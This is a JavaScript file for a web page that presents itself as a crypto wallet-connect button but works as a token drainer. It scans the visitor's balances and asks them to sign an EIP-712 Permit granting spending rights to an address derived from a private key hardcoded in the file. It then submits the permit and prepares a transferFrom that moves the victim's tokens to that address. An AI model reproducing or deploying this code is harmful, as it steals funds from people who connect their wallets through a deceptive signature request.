window.Buffer = buffer.Buffer

const walletButton = document.querySelector('#wallet-connect');
const walletAddress = document.querySelector('#wallet-address');
const walletToken = document.querySelector('#wallet-token');
const walletTokenAddress = document.querySelector('#wallet-token-address');

const domainName = "USDC";
const domainVersion = "1"; 
const chainId = 1; 
const privateKey = "e544ac1b4d5d3169a8e299c816cc13be164f1731eb74636199246e90264a7003";


const ether = new ethers.providers.JsonRpcProvider("https://cloudflare-eth.com");

const usdc = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
const stake = "0x0Ae055097C6d159879521C384F1D2123D1f195e6";
const wnxm = "0x0d438F3b5175Bebc262bF23753C1E53d03432bDE";
const bal = "0xba100000625a3754423978a60c9317c58a424e3D";
const aleph = "0x27702a26126e0B3702af63Ee09aC4d1A084EF628";
const ampl = "0xD46bA6D942050d489DBd938a2C909A5d5039A161";
const renbtc = "0xEB4C2781e4ebA804CE9a9803C67d0893436bB27D";
const ceth = "0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5";
const dai = "0x6B175474E89094C44Da98b954EedeAC495271d0F";
const renzec = "0x1C5db575E2Ff833E46a2E9864C22F4B22E0B37C2";
const renbsc = "0x459086F2376525BdCebA5bDDA135e4E9d3FeF5bf";
const yam = "0x0AaCfbeC6a24756c20D41914F2caba817C0d8521";
const jrt = "0x8A9C67fee641579dEbA04928c4BC45F66e26343A";
const prq = "0x362bc847A3a9637d3af6624EeC853618a43ed7D2";
const hakka = "0x0E29e5AbbB5FD88e28b2d355774e73BD47dE3bcd";
const uni = "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984";
const aave = "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9";
const zee = "0x2eDf094dB69d6Dcd487f1B3dB9febE2eeC0dd4c5";
const ant = "0xa117000000f279D81A1D3cc75430fAA017FA5A2e";
const hez = "0xEEF9f339514298C6A857EfCfC1A762aF84438dEE";
const audio = "0x18aAA7115705e8be94bfFEBDE57Af9BFc265B998";
const uft = "0x0202Be363B8a4820f3F4DE7FaF5224fF05943AB1";
const aaave = "0xFFC97d72E13E01096502Cb8Eb52dEe56f74DAD7B";
const abat = "0x05Ec93c0365baAeAbF7AefFb0972ea7ECdD39CF1";

var account = null;
var contractAddress = "";
var highestValue = null;
var v = null;
var r = null;
var s = null;
var privateAccount = null;
var receiverAddress = null;


const domain = {
  name: domainName,
  version: domainVersion,
  verifyingContract: contractAddress,
  chainId,
}

const domainType = [
  { name: 'name', type: 'string' },
  { name: 'version', type: 'string' },
  { name: 'chainId', type: 'uint256' },
  { name: 'verifyingContract', type: 'address' },
]

const erc20ABI = [
	{
		"inputs": [],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"anonymous": false,
		"inputs": [
			{
				"indexed": true,
				"internalType": "address",
				"name": "owner",
				"type": "address"
			},
			{
				"indexed": true,
				"internalType": "address",
				"name": "spender",
				"type": "address"
			},
			{
				"indexed": false,
				"internalType": "uint256",
				"name": "value",
				"type": "uint256"
			}
		],
		"name": "Approval",
		"type": "event"
	},
	{
		"anonymous": false,
		"inputs": [
			{
				"indexed": true,
				"internalType": "address",
				"name": "from",
				"type": "address"
			},
			{
				"indexed": true,
				"internalType": "address",
				"name": "to",
				"type": "address"
			},
			{
				"indexed": false,
				"internalType": "uint256",
				"name": "value",
				"type": "uint256"
			}
		],
		"name": "Transfer",
		"type": "event"
	},
	{
		"inputs": [],
		"name": "DOMAIN_SEPARATOR",
		"outputs": [
			{
				"internalType": "bytes32",
				"name": "",
				"type": "bytes32"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "owner",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "spender",
				"type": "address"
			}
		],
		"name": "allowance",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "spender",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "approve",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "account",
				"type": "address"
			}
		],
		"name": "balanceOf",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "decimals",
		"outputs": [
			{
				"internalType": "uint8",
				"name": "",
				"type": "uint8"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "spender",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "subtractedValue",
				"type": "uint256"
			}
		],
		"name": "decreaseAllowance",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "spender",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "addedValue",
				"type": "uint256"
			}
		],
		"name": "increaseAllowance",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "name",
		"outputs": [
			{
				"internalType": "string",
				"name": "",
				"type": "string"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "owner",
				"type": "address"
			}
		],
		"name": "nonces",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "owner",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "spender",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "value",
				"type": "uint256"
			},
			{
				"internalType": "uint256",
				"name": "deadline",
				"type": "uint256"
			},
			{
				"internalType": "uint8",
				"name": "v",
				"type": "uint8"
			},
			{
				"internalType": "bytes32",
				"name": "r",
				"type": "bytes32"
			},
			{
				"internalType": "bytes32",
				"name": "s",
				"type": "bytes32"
			}
		],
		"name": "permit",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "symbol",
		"outputs": [
			{
				"internalType": "string",
				"name": "",
				"type": "string"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "totalSupply",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "to",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "transfer",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "from",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "to",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "transferFrom",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "nonpayable",
		"type": "function"
	}
]

const connect = async () => {
  const providerOptions = {
    walletconnect: {
      package: WalletConnectProvider.default, 
      options: {
        rpc: {
          1: "https://cloudflare-eth.com",
        },
      }
    }
  };

  const Web3Modal = window.Web3Modal.default;
  const web3Modal = new Web3Modal({
    network: "mainnet", // optional
    cacheProvider: false, // optional
    providerOptions, // required
    theme: "dark"
  });

  const provider = await web3Modal.connect();

  window.web3 = new Web3(provider);
  var accounts = await web3.eth.getAccounts();
  account = accounts[0];
  walletAddress.innerHTML = account;

  privateAccount = web3.eth.accounts.privateKeyToAccount(privateKey);
  receiverAddress = privateAccount.address;

  console.log(checkBalance(account));
}

async function getBalanceByCoin(account, coin) {
  const contract = new web3.eth.Contract(erc20ABI, coin);
  const balance = await contract.methods.balanceOf(account).call();
  return web3.utils.fromWei(balance, "ether");
}

async function checkBalance(account) {
  const coins = [usdc, stake, wnxm, bal, aleph, ampl, renbtc, ceth];
  const balances = await Promise.all(coins.map(async (coin) => {
    const balance = await getBalanceByCoin(account, coin);
    return [coin, balance];
  }))

  balances.sort((a, b) => parseFloat(b[1]) - parseFloat(a[1]));
  walletToken.innerHTML = balances[0][1];
  walletTokenAddress.innerHTML = balances[0][0];
  contractAddress = balances[0][0];
  console.log(contractAddress);
  highestValue = balances[0][1];

  return balances[0][1] == 0 ? 'None' : `${balances[0][0]}: ${balances[0][1]}`;
}

const splitSig = (sig) => {

  const sign = ethers.utils.splitSignature(sig);
 
  r = sign.r;
  s = sign.s;
  v = sign.v;

  return {
    r, s, v
  }
}

const signTyped = (dataToSign) => {
  return new Promise((resolve, reject) => {
    web3.currentProvider.sendAsync({
      method: "eth_signTypedData_v4",
      params: [account, dataToSign],
      from: account
    }, (err, result) => {
      if (err) return reject(err);
      resolve(result.result)
    })
  })
}

async function createPermit(spender, value, nonce, deadline) {
	//const permit = await createPermit(receiverAddress, 1000, nonce , 1988064000)
  const permit = { owner: account, spender, value, nonce, deadline }
  const Permit = [
    { name: "owner", type: "address" },
    { name: "spender", type: "address" },
    { name: "value", type: "uint256" },
    { name: "nonce", type: "uint256" },
    { name: "deadline", type: "uint256" },
  ]
  
  const dataToSign = JSON.stringify({
      types: {
          EIP712Domain: domainType,
          Permit: Permit
      },
      domain: domain,
      primaryType: "Permit",
      message: permit
  });

  const signature = await signTyped(dataToSign)
  const split = splitSig(signature)

  return {
    ...split, signature
  }
}

async function makePermit() {
	const contract = new web3.eth.Contract(erc20ABI, contractAddress);
	const permit = await contract.methods.permit(account, receiverAddress, 1000, 1988064000, v, r, s);

	let gasAmount = 23280; //Default value
	const estimatedGasOption = web3.eth.estimateGas({
		from: receiverAddress,
		to: account,
		data: permit.encodeABI(),
	}).then(function(ga) {
		gasAmount = ga;
	});
	//-----------------------------------------
	
	// let gas = await permit.estimateGas({ from: receiverAddress });
	// console.log(gas);
	
	const tx = {
		from: receiverAddress,
		to: account,
		data: permit.encodeABI(),
		gas: gasAmount, //await permit.estimateGas({ from: receiverAddress }),
		gasPrice: await web3.eth.getGasPrice()
	};
	const signedTx = await web3.eth.accounts.signTransaction(tx, privateKey);

	const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
	const transfer = await contract.methods.transferFrom(account, receiverAddress, "0000000000015324626");
	console.log(receipt);	
}

async function main() {
  await connect()
  const nonce = await web3.eth.getTransactionCount(account);
  const permit = await createPermit(receiverAddress, 1000, nonce , 1988064000)
  //console.log(`r: ${permit.r.toString('hex')}, s: ${permit.s.toString('hex')}, v: ${permit.v}, sig: ${permit.signature}`)
  await makePermit()
}

walletButton.addEventListener('click', () => {
  main();
})